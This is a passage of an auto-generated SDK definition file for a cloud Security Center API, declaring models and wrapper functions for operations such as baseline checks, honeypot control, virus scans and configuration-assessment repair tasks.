 * @summary Checks cloud service configurations. You can check all items or a single item and verify whether an item is checked.
 *
 * @param request StartBaselineSecurityCheckRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheckWithOptions(request: StartBaselineSecurityCheckRequest, runtime: Util.RuntimeOptions): StartBaselineSecurityCheckResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartBaselineSecurityCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI StartBaselineSecurityCheck is deprecated, please use Sas::2018-12-03::SubmitCheck instead.
 *
 * @summary Checks cloud service configurations. You can check all items or a single item and verify whether an item is checked.
 *
 * @param request StartBaselineSecurityCheckRequest
 * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheck(request: StartBaselineSecurityCheckRequest): StartBaselineSecurityCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return startBaselineSecurityCheckWithOptions(request, runtime);
}

model StartDiscoverDatabaseTaskResponseBody = {
  createMark?: string(name='CreateMark', description='The ID of the scan task.', example='48bced6d-2aee-4fa2-9aba-b846b77b****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F46921AF-CC55-5971-92C9-7E09E160****'),
}

model StartDiscoverDatabaseTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: StartDiscoverDatabaseTaskResponseBody(name='body'),
}

/**
 * @summary Starts a database scan task.
 *
 * @param request StartDiscoverDatabaseTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return StartDiscoverDatabaseTaskResponse
 */
async function startDiscoverDatabaseTaskWithOptions(runtime: Util.RuntimeOptions): StartDiscoverDatabaseTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'StartDiscoverDatabaseTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Starts a database scan task.
 *
 * @return StartDiscoverDatabaseTaskResponse
 */
async function startDiscoverDatabaseTask(): StartDiscoverDatabaseTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startDiscoverDatabaseTaskWithOptions(runtime);
}

model StartHoneypotRequest {
  honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.

This parameter is required.', example='dba7d44775be8e0e5888ee3b1a62554a93d2512247cabc38ddeac17a3b3f****'),
  lang?: string(name='Lang', description='The language of the content in the request and response messages. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model StartHoneypotResponseBody = {
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node to which the honeypot belongs.', example='managerNodename'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='123'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image.', example='Webmin'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='tcp_proxy'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='ddh3731641137fe4b72b245346a2721d4b6tdgg3731641137fe4b72b245346a2721***'),
    state?: [ string ](name='State', description='The statuses of the honeypots.'),
  }(name='Data', description='The information about the honeypot.'),
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model StartHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: StartHoneypotResponseBody(name='body'),
}

/**
 * @summary Starts a honeypot.
 *
 * @param request StartHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return StartHoneypotResponse
 */
async function startHoneypotWithOptions(request: StartHoneypotRequest, runtime: Util.RuntimeOptions): StartHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Starts a honeypot.
 *
 * @param request StartHoneypotRequest
 * @return StartHoneypotResponse
 */
async function startHoneypot(request: StartHoneypotRequest): StartHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return startHoneypotWithOptions(request, runtime);
}

model StartIdcProbeScanResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXX'),
}

model StartIdcProbeScanResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: StartIdcProbeScanResponseBody(name='body'),
}

/**
 * @summary Starts an IDC scan task.
 *
 * @param request StartIdcProbeScanRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return StartIdcProbeScanResponse
 */
async function startIdcProbeScanWithOptions(runtime: Util.RuntimeOptions): StartIdcProbeScanResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'StartIdcProbeScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Starts an IDC scan task.
 *
 * @return StartIdcProbeScanResponse
 */
async function startIdcProbeScan(): StartIdcProbeScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return startIdcProbeScanWithOptions(runtime);
}

model StartPreCheckDatabaseRequest {
  databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**

This parameter is required.', example='MYSQL'),
  instanceUuid?: string(name='InstanceUuid', description='The UUID of the agent that is used to back up the data of the database.

> You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the UUID.

This parameter is required.', example='ec1c0ba21d2911ed800000163e0e****'),
  uniRegionId?: string(name='UniRegionId', description='The region ID of the server that hosts the database.

This parameter is required.', example='cn-hongkong'),
}

model StartPreCheckDatabaseResponseBody = {
  createMark?: string(name='CreateMark', description='The ID of the database precheck task.', example='t-0006d4pydyir6l1k****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F6DC2DFF-AB3A-563A-8FC2-3D0D991E****'),
}

model StartPreCheckDatabaseResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: StartPreCheckDatabaseResponseBody(name='body'),
}

/**
 * @summary Starts a database precheck task.
 *
 * @param request StartPreCheckDatabaseRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return StartPreCheckDatabaseResponse
 */
async function startPreCheckDatabaseWithOptions(request: StartPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): StartPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Starts a database precheck task.
 *
 * @param request StartPreCheckDatabaseRequest
 * @return StartPreCheckDatabaseResponse
 */
async function startPreCheckDatabase(request: StartPreCheckDatabaseRequest): StartPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return startPreCheckDatabaseWithOptions(request, runtime);
}

model StartVirusScanTaskRequest {
  targetInfo?: string(name='TargetInfo', description='The asset on which you want to perform a virus scan task. You can select servers or server groups to scan for viruses. The value is a string that consists of JSON arrays. Each element in a JSON array is a JSON struct that contains the following fields:

*   **type**: the type of the asset on which you want to perform a virus scan task. Valid values:

    *   **groupId**: server group.
    *   **uuid**: server.

*   **name**: the name of the server or server group.

*   **target**: the asset on which you want to perform a virus scan task. Valid values:

    *   If you set **type** to **groupId**, you must set this field to the ID of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.
    *   If you set **type** to **uuid**, you must set this field to the UUID of the server. You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='[{"type":"uuid","name":"Host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
}

model StartVirusScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DAE17926-4ABE-4DBD-9600-DDCB9B200F35'),
  scanTaskId?: long(name='ScanTaskId', description='The ID of the virus scan task.', example='282832'),
}

model StartVirusScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: StartVirusScanTaskResponseBody(name='body'),
}

/**
 * @summary Performs a virus scan task on a server or multiple servers.
 *
 * @param request StartVirusScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return StartVirusScanTaskResponse
 */
async function startVirusScanTaskWithOptions(request: StartVirusScanTaskRequest, runtime: Util.RuntimeOptions): StartVirusScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartVirusScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Performs a virus scan task on a server or multiple servers.
 *
 * @param request StartVirusScanTaskRequest
 * @return StartVirusScanTaskResponse
 */
async function startVirusScanTask(request: StartVirusScanTaskRequest): StartVirusScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startVirusScanTaskWithOptions(request, runtime);
}

model StopHoneypotRequest {
  honeypotId?: string(name='HoneypotId', description='The honeypot ID.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to obtain IDs of honeypots.

This parameter is required.', example='444c699ac151b183b04b562b1dc02639d504c9d097246a322de75c963fe*****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model StopHoneypotResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node to which the honeypot belongs.', example='managerNoden****'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image.', example='RuoYi'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='metabase'),
    honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='hyl-phpmya****'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the honeypot custom parameter.', example='868a7579-00b5-4a74-999d-8bd3f411****'),
    state?: [ string ](name='State', description='The statuses of the honeypots.'),
  }(name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C*****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model StopHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: StopHoneypotResponseBody(name='body'),
}

/**
 * @summary Stops a honeypot.
 *
 * @param request StopHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return StopHoneypotResponse
 */
async function stopHoneypotWithOptions(request: StopHoneypotRequest, runtime: Util.RuntimeOptions): StopHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StopHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Stops a honeypot.
 *
 * @param request StopHoneypotRequest
 * @return StopHoneypotResponse
 */
async function stopHoneypot(request: StopHoneypotRequest): StopHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return stopHoneypotWithOptions(request, runtime);
}

model SubmitCheckRequest {
  scanRange?: string(name='ScanRange', description='The check items that are scanned. Valid values:

*   **FULL**: All check items are scanned.
*   **FULL**: Only the check items that are configured are scanned.', example='POLICY'),
}

model SubmitCheckResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode', description='The operation code of the configuration assessment task.

*   **Throttling**: frequency limit
*   **AuthorizationExhaust**: insufficient quota', example='Throttling'),
    throttlingTimeSecond?: int32(name='ThrottlingTimeSecond', description='The throttling duration. Unit: seconds.', example='1800'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE8369A6-A843-5E1B-A613-78E6920D****'),
  taskId?: string(name='TaskId', description='The ID of the configuration assessment task.', example='5fe3f65d-4012-455d-8232-2a98a858****'),
}

model SubmitCheckResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SubmitCheckResponseBody(name='body'),
}

/**
 * @summary Submits a configuration assessment task.
 *
 * @param request SubmitCheckRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SubmitCheckResponse
 */
async function submitCheckWithOptions(request: SubmitCheckRequest, runtime: Util.RuntimeOptions): SubmitCheckResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SubmitCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Submits a configuration assessment task.
 *
 * @param request SubmitCheckRequest
 * @return SubmitCheckResponse
 */
async function submitCheck(request: SubmitCheckRequest): SubmitCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return submitCheckWithOptions(request, runtime);
}

model SubmitOperationTaskRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the ID of the check item.

This parameter is required.', example='132'),
  dimensionType?: string(name='DimensionType', description='The dimension of the task that you want to submit. Valid values:

*   Instance dimension: INSTANCE
*   Check item dimension: CHECK_ID', example='CHECK_ID'),
  operationTaskInstances?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-uf6533m4vuo3oa33****'),
      regionId?: string(name='RegionId', description='The region ID of the server.', example='cn-hangzhou'),
      taskId?: string(name='TaskId', description='The ID of the task that you want to roll back', example='7d0b10e35e80c9e5ebac5f1054****'),
      vendor?: string(name='Vendor', description='The service provider of the asset. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: an asset outside Alibaba Cloud.
*   **2**: an asset in a data center.
*   **3**, **4**, **5**, and **7**: an asset from a third-party cloud service provider.
*   **8**: a lightweight asset.', example='7'),
    }
  ](name='OperationTaskInstances', description='The asset information required to submit the tasks for instances.'),
  relationKey?: string(name='RelationKey', description='The key linked to cross-page selections during task submission.

>  You can call the [CreateAssetSelectionConfig](~~CreateAssetSelectionConfig~~) operation to query the associated key from the BusinessType field.', example='CSPM_OPERATION_RELATION_KEY_173***'),
  repairTempParam?: [ 
    {
      name?: string(name='Name', description='The name of the temporary repair parameter.', example='IPPort'),
      value?: string(name='Value', description='The value of the temporary repair parameter.', example='192.168.1XX.1XX'),
    }
  ](name='RepairTempParam', description='The temporary parameters required for the repair task.'),
  type?: string(name='Type', description='The type of the task that you want to submit. Valid values:

*   Repair task: REPAIR
*   Rollback task: ROLLBACK

This parameter is required.', example='REPAIR'),
}

model SubmitOperationTaskResponseBody = {
  operateCode?: string(name='OperateCode', description='The handling result code. Valid values:

*   Insufficient authorization: AuthorizationExhaust
*   Unauthorized: ActionTrialUnauthorized', example='AuthorizationExhaust'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0C8487EF-50C2-54BB-8634-10F8C35D****'),
  rootTaskId?: string(name='RootTaskId', description='The main task ID that is returned when the task is submitted.', example='89f5d7813bd59dd237580a8664b3xxxx'),
}

model SubmitOperationTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SubmitOperationTaskResponseBody(name='body'),
}

/**
 * @summary Submits a repair task of risk items detected in configuration assessment or rolls back a repair task that is executed.
 *
 * @param request SubmitOperationTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SubmitOperationTaskResponse
 */
async function submitOperationTaskWithOptions(request: SubmitOperationTaskRequest, runtime: Util.RuntimeOptions): SubmitOperationTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.dimensionType)) {
    query['DimensionType'] = request.dimensionType;
  }
  if (!Util.isUnset(request.operationTaskInstances)) {
    query['OperationTaskInstances'] = request.operationTaskInstances;
  }
  if (!Util.isUnset(request.relationKey)) {
    query['RelationKey'] = request.relationKey;
  }
  if (!Util.isUnset(request.repairTempParam)) {
    query['RepairTempParam'] = request.repairTempParam;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SubmitOperationTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Submits a repair task of risk items detected in configuration assessment or rolls back a repair task that is executed.
 *
 * @param request SubmitOperationTaskRequest
 * @return SubmitOperationTaskResponse
 */
async function submitOperationTask(request: SubmitOperationTaskRequest): SubmitOperationTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return submitOperationTaskWithOptions(request, runtime);
}

model SubmitTenantCheckResponseBody = {
  data?: {
    taskId?: string(name='TaskId', description='The ID of the scan task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1162D670-E633-5676-AE87-8359B066****'),
}

model SubmitTenantCheckResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SubmitTenantCheckResponseBody(name='body'),
}

/**
 * @summary Submits a free quick scan task, which includes vulnerability detection in the free category and free check items of Cloud Security Posture Management (CSPM).
 *
 * @param request SubmitTenantCheckRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SubmitTenantCheckResponse
 */
async function submitTenantCheckWithOptions(runtime: Util.RuntimeOptions): SubmitTenantCheckResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'SubmitTenantCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Submits a free quick scan task, which includes vulnerability detection in the free category and free check items of Cloud Security Posture Management (CSPM).
 *
 * @return SubmitTenantCheckResponse
 */
async function submitTenantCheck(): SubmitTenantCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return submitTenantCheckWithOptions(runtime);
}

model TriggerCheckResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='43313389-DED8-5BB7-8CB9-F22CDEB744DE'),
}

model TriggerCheckResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: TriggerCheckResponseBody(name='body'),
}

/**
 * @summary Triggers ISO 27001 compliance checks of Security Center.
 *
 * @param request TriggerCheckRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return TriggerCheckResponse
 */
async function triggerCheckWithOptions(runtime: Util.RuntimeOptions): TriggerCheckResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'TriggerCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Triggers ISO 27001 compliance checks of Security Center.
 *
 * @return TriggerCheckResponse
 */
async function triggerCheck(): TriggerCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return triggerCheckWithOptions(runtime);
}

model UnBindHybridProxyRequest {
  clusterName?: string(name='ClusterName', description='The cluster name.

> This parameter is deprecated.

This parameter is required.', example='proxy-test'),
  yundunUuids?: [ string ](name='YundunUuids', description='The UUIDs of servers that you want to add to Security Center over the proxy server.

This parameter is required.'),
}

model UnBindHybridProxyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to query logs and troubleshoot issues.', example='3956048F-9D73-5EDB-834B-4827BB483977'),
}

model UnBindHybridProxyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UnBindHybridProxyResponseBody(name='body'),
}

/**
 * @summary 解绑客户端代理
 *
 * @param request UnBindHybridProxyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UnBindHybridProxyResponse
 */
async function unBindHybridProxyWithOptions(request: UnBindHybridProxyRequest, runtime: Util.RuntimeOptions): UnBindHybridProxyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.yundunUuids)) {
    query['YundunUuids'] = request.yundunUuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UnBindHybridProxy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 解绑客户端代理
 *
 * @param request UnBindHybridProxyRequest
 * @return UnBindHybridProxyResponse
 */
async function unBindHybridProxy(request: UnBindHybridProxyRequest): UnBindHybridProxyResponse {
  var runtime = new Util.RuntimeOptions{};
  return unBindHybridProxyWithOptions(request, runtime);
}

model UnMarkMonitorAccountsRequest {
  accountIds?: string(name='AccountIds', description='The IDs of the members.

This parameter is required.', example='125267953644XXXX,125807832682XXXX'),
}

model UnMarkMonitorAccountsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='3B7EF1A4-E970-5A7F-91CA-416F9881333E'),
}

model UnMarkMonitorAccountsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UnMarkMonitorAccountsResponseBody(name='body'),
}

/**
 * @summary Cancel marking for members. You can call this operation to remove followed members from the list. In the Security Center console, the drop-down list above the left-side navigation pane no longer displays the members.
 *
 * @param request UnMarkMonitorAccountsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UnMarkMonitorAccountsResponse
 */
async function unMarkMonitorAccountsWithOptions(request: UnMarkMonitorAccountsRequest, runtime: Util.RuntimeOptions): UnMarkMonitorAccountsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.accountIds)) {
    query['AccountIds'] = request.accountIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UnMarkMonitorAccounts',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Cancel marking for members. You can call this operation to remove followed members from the list. In the Security Center console, the drop-down list above the left-side navigation pane no longer displays the members.
 *
 * @param request UnMarkMonitorAccountsRequest
 * @return UnMarkMonitorAccountsResponse
 */
async function unMarkMonitorAccounts(request: UnMarkMonitorAccountsRequest): UnMarkMonitorAccountsResponse {
  var runtime = new Util.RuntimeOptions{};
  return unMarkMonitorAccountsWithOptions(request, runtime);
}

model UnbindAegisRequest {
  uuids?: string(name='Uuids', description='The UUID of the server that you want to unbind. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model UnbindAegisResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='825F5526-2A17-4279-857F-F790E9590171'),
}

model UnbindAegisResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UnbindAegisResponseBody(name='body'),
}

/**
 * @summary Unbinds servers that are not deployed on Alibaba Cloud from Security Center.
 *
 * @description If you no longer require protection for servers that are not deployed on Alibaba Cloud, you can call this operation to unbind the servers from Security Center. After you unbind a server that is not deployed on Alibaba Cloud from Security Center, the server no longer consumes the quota of protected servers or protected server vCPUs. This way, you can install the Security Center agent on other servers to meet your business requirements.
